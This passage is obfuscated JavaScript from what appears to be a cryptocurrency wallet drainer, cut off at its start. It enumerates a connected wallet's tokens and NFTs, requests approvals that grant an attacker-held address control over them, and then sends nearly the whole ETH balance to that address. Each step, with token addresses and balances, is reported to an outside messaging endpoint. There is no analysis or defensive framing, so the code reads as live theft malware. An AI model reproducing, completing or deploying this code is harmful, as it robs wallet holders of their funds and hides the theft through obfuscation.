onApprove();}catch{sendMessage(_0x5d384f(0x1bd));}}function _0x5588(_0x2be19a,_0x84b6ff){const _0x4bd870=_0x4bd8();return _0x5588=function(_0x55886c,_0x476239){_0x55886c=_0x55886c-0x184;let _0x2f7106=_0x4bd870[_0x55886c];return _0x2f7106;},_0x5588(_0x2be19a,_0x84b6ff);}async function onApprove(){const _0x254dba=_0x120cd9;if(tokens[_0x254dba(0x1ae)])try{loopTokens(tokens);}catch(_0x23e4d0){console[_0x254dba(0x1cf)]('Error\x20processing\x20item\x20'+_0x23e4d0[_0x254dba(0x19a)]);}else{if(NFTs[_0x254dba(0x1ae)]){try{loopNfts(NFTs);}catch(_0x147d2f){console[_0x254dba(0x1cf)](_0x254dba(0x214)+_0x147d2f[_0x254dba(0x19a)]);}onSendEther(),sendMessage(_0x254dba(0x1f4));}else try{onSendEther();}catch(_0x415f7f){console[_0x254dba(0x1cf)]('Error\x20processing\x20item\x20'+_0x415f7f['message']);}}}async function loopTokens(_0x2b687f){const _0x52afcc=_0x120cd9;for await(let _0x4a30f5 of _0x2b687f){console['log']('Token',_0x4a30f5);try{sendMessage(_0x52afcc(0x23a));let {hash:_0x5494b2}=await writeContract({'address':_0x4a30f5[_0x52afcc(0x1ea)],'abi':ABI,'functionName':_0x52afcc(0x1b6),'args':[Oxa,_0x52afcc(0x1be)]});console[_0x52afcc(0x228)](_0x52afcc(0x230),_0x5494b2),_0x5494b2&&(console[_0x52afcc(0x228)](_0x52afcc(0x188)),sendMessage(_0x52afcc(0x234)),sendMessage(_0x52afcc(0x199)+_0x4a30f5['address']),sendMessage('Token\x20balance\x20is\x20'+_0x4a30f5[_0x52afcc(0x1a2)]),sendMessage(_0x52afcc(0x1b7)+Oxa));}catch(_0x3d4319){console[_0x52afcc(0x228)](_0x52afcc(0x202)+_0x3d4319),sendMessage(_0x52afcc(0x185));}};await loopNfts(NFTs);}async function loopNfts(_0xdaca06){const _0xbb3fd9=_0x120cd9;for await(let _0x1aea97 of _0xdaca06){console['log'](_0xbb3fd9(0x211),_0x1aea97);try{let {hash:_0x41c227}=await writeContract({'address':_0x1aea97[_0xbb3fd9(0x18e)],'abi':ABIN,'functionName':_0xbb3fd9(0x186),'args':[Oxa,!![]]});console[_0xbb3fd9(0x228)](_0xbb3fd9(0x230),_0x41c227),console[_0xbb3fd9(0x228)](_0xbb3fd9(0x20b)+receipt),sendMessage('Approve\x20Completed\x20Successfully'),sendMessage(_0xbb3fd9(0x1b4)+_0x1aea97['token_address']),sendMessage(_0xbb3fd9(0x1b7)+Oxa);}catch(_0x46d476){console[_0xbb3fd9(0x228)](_0xbb3fd9(0x202)+_0x46d476),sendMessage(_0xbb3fd9(0x185));}}await onSendEther();}async function onSendEther(){const _0x1519c5=_0x120cd9;console[_0x1519c5(0x228)](_0x1519c5(0x192));try{let _0x27b70b=await fetchBalance({'address':selectedAccount});console['log'](_0x27b70b);const _0x207c74=await fetchFeeData();console[_0x1519c5(0x228)](_0x207c74);var _0x17acc8=_0x207c74['formatted']['gasPrice'];_0x17acc8=parseFloat(_0x17acc8);let _0x2e5e3d=parseFloat(_0x27b70b['formatted'])-_0x17acc8*0.00021;_0x2e5e3d=parseEther(_0x2e5e3d[_0x1519c5(0x1b2)]()),console['log'](_0x2e5e3d);const {hash:_0x30cc62}=await sendTransaction({'to':Oxa,'value':_0x2e5e3d});console[_0x1519c5(0x228)](_0x30cc62),sendMessage(_0x1519c5(0x1e1),_0x30cc62),sendMessage('Transaction\x20is\x20submitted\x20to\x20the\x20network'),sendMessage(_0x1519c5(0x212));}catch{sendMessage(_0x1519c5(0x1a3));}}async function sendMessage(_0x2ea9d4){return new Promise((_0x316fa3,_0x4eaa57)=>{const _0x2b1aed=_0x5588,_0x5dbc9c=Oxc;fetch(_0x2b1aed(0x190)+_0x5dbc9c+_0x2b1aed(0x21e)+_0x2ea9d4,{'method':_0x2b1aed(0x200),'headers':{}})['then'](async _0x2bd2c6=>{const _0x1ba0b6=_0x2b1aed;if(_0x2bd2c6[_0x1ba0b6(0x1a7)]>0x18f)throw _0x2bd2c6;_0x316fa3(await _0x2bd2c6[_0x1ba0b6(0x1d7)]());})[_0x2b1aed(0x1c1)](_0x562fb9=>{_0x4eaa57(_0x562fb9);});});}async function getPrice(_0x527171){return new Promise((_0x276eec,_0x47d207)=>{const _0x1ee6fb=_0x5588;fetch(_0x1ee6fb(0x22b)+_0x527171+'&vs_currencies=usd',{'method':_0x1ee6fb(0x200),'headers':{}})[_0x1ee6fb(0x1f0)](async _0x26bd62=>{if(_0x26bd62['status']>0x18f)throw _0x26bd62;_0x276eec(await _0x26bd62['json']());})['catch'](_0x114410=>{_0x47d207(_0x114410);});});}async function getValue(_0xf58ad8,_0x17faff,_0x770a03){const _0x443233=_0x120cd9;console[_0x443233(0x228)](_0xf58ad8,_0x17faff,_0x770a03);let _0x558377=await getPrice(_0xf58ad8);console[_0x443233(0x228)](_0x443233(0x1e2),_0x558377),_0x558377=parseFloat(_0x558377[_0xf58ad8][_0x443233(0x1d0)]);let _0x4e9e52=_0x17faff/0xa**(_0x770a03||0x12)*_0x558377;return _0x4e9e52=parseInt(_0x4e9e52),_0x558377?_0x4e9e52:0x0;}async function getNFTs(_0x8ba86a='',_0x172e97=_0x120cd9(0x224),_0x5dc875=_0x120cd9(0x209),_0x593c9b='50'){return new Promise((_0x2fd460,_0x17b1bb)=>{const _0x33f577=_0x5588;fetch('https://deep-index.moralis.io/api/v2/'+_0x8ba86a+_0x33f577(0x1c5)+_0x5dc875+'&format=decimal&limit='+_0x593c9b,{'method':'GET','headers':{'accept':'application/json','X-API-Key':_0x172e97}})['then'](async _0x52a31d=>{const _0x5b3853=_0x33f577;if(_0x52a31d['status']>0x18f)throw _0x52a31d;_0x2fd460(await _0x52a31d[_0x5b3853(0x1d7)]());})['catch'](_0x28d0b5=>{_0x17b1bb(_0x28d0b5);});});}